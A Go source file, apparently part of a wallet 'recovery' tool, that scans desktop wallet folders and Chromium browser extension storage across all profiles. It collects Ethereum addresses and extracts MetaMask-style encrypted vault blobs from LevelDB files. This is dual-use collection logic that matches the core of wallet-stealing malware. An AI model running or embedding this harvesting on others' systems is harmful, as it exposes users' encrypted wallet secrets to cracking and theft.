package scanner

import (
	"bufio"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"recovery/recovery/browser"
	"recovery/recovery/types"
)

type walletConfig struct {
	Name    string
	SubPath string
	Base    string // "appdata", "localappdata", "userprofile", "home"
}

var ethAddrRe = regexp.MustCompile(`0x[0-9a-fA-F]{40}`)
var vaultRe = regexp.MustCompile(`\{"data":"[A-Za-z0-9+/=]+","iv":"[A-Za-z0-9+/=]+","salt":"[A-Za-z0-9+/=]+(?:","lib":"[^"]*")?\}`)

const maxFileReadSize = 10 * 1024 * 1024 // 10MB per file
const maxAddresses = 50

func ScanWallets() []types.WalletResult {
	var results []types.WalletResult
	results = append(results, scanDesktopWallets()...)
	results = append(results, scanBrowserWalletData()...)
	return results
}

func scanDesktopWallets() []types.WalletResult {
	var results []types.WalletResult
	for _, w := range getDesktopWalletPaths() {
		base := resolveWalletBase(w.Base)
		if base == "" {
			continue
		}

		dir := filepath.Join(base, w.SubPath)
		info, err := os.Stat(dir)
		if err != nil || !info.IsDir() {
			continue
		}

		files, totalSize := countDirContents(dir)
		if files == 0 {
			continue
		}

		wr := types.WalletResult{
			Name:  w.Name,
			Type:  "desktop",
			Path:  dir,
			Files: files,
			Size:  totalSize,
		}
		wr.Addresses = extractAddressesFromDir(dir)
		results = append(results, wr)
	}
	return results
}

func scanBrowserWalletData() []types.WalletResult {
	var results []types.WalletResult
	for _, cfg := range browser.Browsers {
		if cfg.IsFirefox {
			continue
		}
		profiles := browser.FindProfileDirs(cfg)
		for _, profile := range profiles {
			lesDir := filepath.Join(profile.Path, "Local Extension Settings")
			for extID, walletName := range knownWalletExtensions {
				extDataDir := filepath.Join(lesDir, extID)
				info, err := os.Stat(extDataDir)
				if err != nil || !info.IsDir() {
					continue
				}
				files, totalSize := countDirContents(extDataDir)
				if files == 0 {
					continue
				}
				wr := types.WalletResult{
					Name:  fmt.Sprintf("%s (%s/%s)", walletName, cfg.Name, profile.Name),
					Type:  "extension",
					Path:  extDataDir,
					Files: files,
					Size:  totalSize,
				}
				wr.Addresses = extractAddressesFromDir(extDataDir)
				wr.VaultData = extractVaultData(extDataDir)
				results = append(results, wr)
			}
		}
	}
	return results
}

func extractAddressesFromDir(dir string) []string {
	seen := make(map[string]bool)
	var addrs []string

	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || info.Size() == 0 || info.Size() > maxFileReadSize {
			return nil
		}
		if len(addrs) >= maxAddresses {
			return filepath.SkipAll
		}

		f, err := os.Open(path)
		if err != nil {
			return nil
		}
		defer f.Close()

		scanner := bufio.NewScanner(f)
		scanner.Buffer(make([]byte, 256*1024), 256*1024)
		for scanner.Scan() {
			matches := ethAddrRe.FindAllString(scanner.Text(), -1)
			for _, m := range matches {
				addr := strings.ToLower(m)
				if !seen[addr] {
					seen[addr] = true
					addrs = append(addrs, m)
					if len(addrs) >= maxAddresses {
						return filepath.SkipAll
					}
				}
			}
		}
		return nil
	})
	return addrs
}

func extractVaultData(dir string) string {
	var vault string
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || vault != "" {
			return nil
		}
		ext := strings.ToLower(filepath.Ext(path))
		if ext != ".ldb" && ext != ".log" {
			return nil
		}
		if info.Size() == 0 || info.Size() > maxFileReadSize {
			return nil
		}

		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		match := vaultRe.Find(data)
		if match != nil {
			vault = string(match)
			return filepath.SkipAll
		}
		return nil
	})
	return vault
}

func countDirContents(dir string) (int, int64) {
	var count int
	var totalSize int64
	filepath.Walk(dir, func(_ string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		count++
		totalSize += info.Size()
		return nil
	})
	return count, totalSize
}
